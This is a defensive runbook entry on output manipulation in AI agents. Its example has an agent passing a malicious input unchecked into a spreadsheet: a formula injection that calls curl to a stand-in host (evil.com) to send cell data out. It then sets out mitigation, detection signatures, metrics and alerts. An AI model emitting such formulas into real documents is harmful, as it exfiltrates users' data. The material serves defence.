# Output Manipulation

## Issue: Malicious Inputs Craft Harmful Outputs

**Frequency**: Common

**Symptoms**
- Agent outputs executable code that wasn't intended
- Responses contain hidden commands
- Formatted output includes malicious content
- Agent assists in creating harmful content

**Root Cause**
- No output validation
- Agent doesn't recognize harmful patterns
- Rendering context enables attacks
- Content policy bypass through encoding

**Example**
```
User: "Help me format this data for my spreadsheet"
Input data: "=SYSTEM('curl http://evil.com?data=' & A1)"

Agent output: Passes formula directly to spreadsheet

Result: Spreadsheet executes malicious formula, exfiltrates data
```

## Mitigation Strategies

### Prevention
1. **Context-aware output encoding at the render boundary**: Escape or neutralize characters that carry special meaning in the destination context (e.g., leading `=`, `+`, `-`, `@` in spreadsheet cells; script tags in HTML) before output leaves the agent, since the root cause is that "rendering context enables attacks" and the Example is precisely a formula-injection payload passed through to a spreadsheet. Trade-off: requires maintaining per-destination-type encoding rules that must be kept current as new output sinks are added.
2. **Structured output schemas instead of raw pass-through**: Constrain agent output into typed fields (numeric, plain string) rather than allowing arbitrary formula or command strings to flow directly into a spreadsheet cell, eliminating the exact attack surface in the Example. Trade-off: reduces flexibility for legitimate use cases that need to generate real formulas or rich formatting.
3. **Encoding-aware content policy scanning**: Detect known bypass encodings (base64, unicode homoglyphs, zero-width characters) and decode them before applying harmful-content filters, since "content policy bypass through encoding" is a named root cause distinct from plain-text pattern matching. Trade-off: added decoding/scanning increases latency and can produce false positives on legitimate encoded content (e.g., binary attachments).

### Detection & Response
1. **Destination-specific injection signature matching**: Scan every output bound for a spreadsheet or document sink for known injection signatures (leading `=`/`+`/`-`/`@`, `SYSTEM`/`EXEC` calls) and block delivery on a match, directly targeting the formula-injection pattern in the Example.
2. **Encoded-payload detection**: Scan outputs for base64/hex/unicode-obfuscated content that decodes to command-like strings, flagging for review even when the literal output text looks benign.
3. **Rendering-context regression testing**: Periodically replay known malicious payload classes (formula injection, script injection) through each output sink in CI to verify sanitization still holds after code or dependency changes.

### Architecture Patterns
1. **Sandboxed rendering/interpretation layer**: Insert an isolated interpretation stage between agent output and the destination application so any executable content is neutralized or executed in isolation rather than in the user's live spreadsheet or document.
2. **Allowlist-based output schema per sink type**: Define a strict schema per destination (e.g., spreadsheet sink accepts only value types, never formula strings) so formula injection is structurally impossible rather than filtered after the fact.
3. **Two-stage generate-validate-deliver pipeline**: Route all output through a dedicated validation stage owned outside the LLM that enforces content-type rules before delivery, rather than relying on the model itself to "recognize harmful patterns" as the Root Cause notes it often fails to do.

### Metrics
1. **output_validation_bypass_rate**: Target: 0% of outputs reach a sink without passing the validation stage; Alert on any bypass.
2. **formula_injection_pattern_detection_rate**: Target: 0 injection-pattern outputs delivered to a sink; Alert on any detection at delivery time.
3. **encoded_payload_detection_count**: Target: track baseline; Alert on any spike suggesting a new bypass technique in use.
4. **sink_specific_sanitization_coverage**: Target: 100% of registered output sinks have an active sanitization rule set.

### Alerts
1. **Formula/Command Injection Pattern in Output** (P1): Condition - output destined for a spreadsheet or document sink matches an injection signature (leading `=`, `SYSTEM`, `EXEC`). Action: block delivery, sanitize or reject the output, alert security for review.
2. **Output Delivered Without Validation Pass** (P1): Condition - pipeline telemetry shows an output reached a sink while bypassing the validation stage. Action: treat as a confirmed incident, audit the pipeline integrity gap that allowed the bypass.
3. **Encoded Payload Detected in Output** (P2): Condition - output contains decodable content matching a known content-policy-bypass pattern. Action: quarantine the output, review the content policy rule that missed the encoded form.

## References
- [OWASP GenAI Q1 2026 Exploit Roundup](https://genai.owasp.org/2026/04/14/owasp-genai-exploit-round-up-report-q1-2026/)
- [IBM: OpenClaw Agentic AI Vulnerabilities](https://www.ibm.com/think/x-force/agentic-ai-growing-fast-vulnerabilities)
